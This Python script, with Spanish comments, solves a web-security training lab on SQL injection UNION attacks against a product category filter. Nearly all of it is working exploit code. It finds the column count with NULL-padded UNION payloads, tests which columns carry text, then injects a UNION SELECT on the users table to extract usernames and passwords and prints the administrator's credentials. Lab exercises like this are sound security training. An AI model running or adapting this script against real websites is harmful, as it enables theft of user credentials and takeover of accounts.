# Lab: SQL injection UNION attack, retrieving data from other tables

#This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.
#The database contains a different table called users, with columns called username and password.
#To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.

import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

#variables globales
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxyjp = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}
nombre_parametro = "Gifts"
ruta = f"filter?category={nombre_parametro}"

def retorna_cantidad_columnas(url):
    columna = 0
    bandera = True
    while bandera:
        columna += 1
        payload_rcc = "' UNION SELECT " + ", ".join(["NULL"] * columna) + "--"
        Solicitud_rcc = requests.get(url + ruta + payload_rcc, verify=False,proxies=proxyjp)
        respuesta_rcc = Solicitud_rcc.text
        if "UNION SELECT" in respuesta_rcc:
            bandera = False
            return columna
    return None

def retorna__tipo_dato_texto_columna(url,ColumnaAValidar):
    if ColumnaAValidar == 1:
        payload_rtdtc = "' UNION SELECT 'jpmg',NULL--"
        solicitud_rtdtc = requests.get(url + ruta + payload_rtdtc,verify=False,proxies=proxyjp)
        respuesta_rtdtc = solicitud_rtdtc.text
        if "jpmg" in respuesta_rtdtc:
            return True
        else:
            return False 
    if ColumnaAValidar == 2:
        payload_rtdtc = "' UNION SELECT NULL,'jpmg'--"
        solicitud_rtdtc = requests.get(url + ruta + payload_rtdtc,verify=False,proxies=proxyjp)
        respuesta_rtdtc = solicitud_rtdtc.text
        if "jpmg" in respuesta_rtdtc:
            return True
        else:
            return False    
    if ColumnaAValidar >= 3:
        print("[-] Error: Cantidad de columnas excede la funcionalidad")

def Obtener_credenciales(url,CantidadColumnas,td_columna1,td_columna2):
    if CantidadColumnas == 2:
        if td_columna1 == True and td_columna2 == True:
            payload_oc = "' UNION SELECT username, password FROM users--"
            solicitud_oc = requests.get(url + ruta + payload_oc, verify=False, proxies=proxyjp)
            respusta_oc = solicitud_oc.text
            parseado_oc = BeautifulSoup(respusta_oc,'html.parser')
            bloques_tr = parseado_oc.find_all('tr')
            for recoriendo_tr in bloques_tr:
                bloques_th = recoriendo_tr.find('th')
                if bloques_th and bloques_th.get_text().strip() == "administrator":
                    bloques_td = recoriendo_tr.find('td')
                    if bloques_td and bloques_td.get_text().strip():
                        print("[+] Laboratorio solucionado con exito: ")
                        print("[+] Usuario: ", bloques_th.get_text().strip())
                        print("[+] Contraseña: ", bloques_td.get_text().strip())
                        print("[+] Ahora solo solo inicie sesión con las credenciales")
    else: 
        print("[-] Error: Cantidad de columnas no coincide con el ejercicio")  



if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        cantidad_columnas = retorna_cantidad_columnas(url)
        tipo_dato_columna_1 = retorna__tipo_dato_texto_columna(url,1)
        tipo_dato_columna_2 = retorna__tipo_dato_texto_columna(url,2)
        Obtener_credenciales(url,cantidad_columnas,tipo_dato_columna_1,tipo_dato_columna_2)

    except IndexError:
        print("[-] Uso: %s <url> " % sys.argv[0])
        print("[-] Ejemplo: %s https://ejemplo.com " % sys.argv[0])
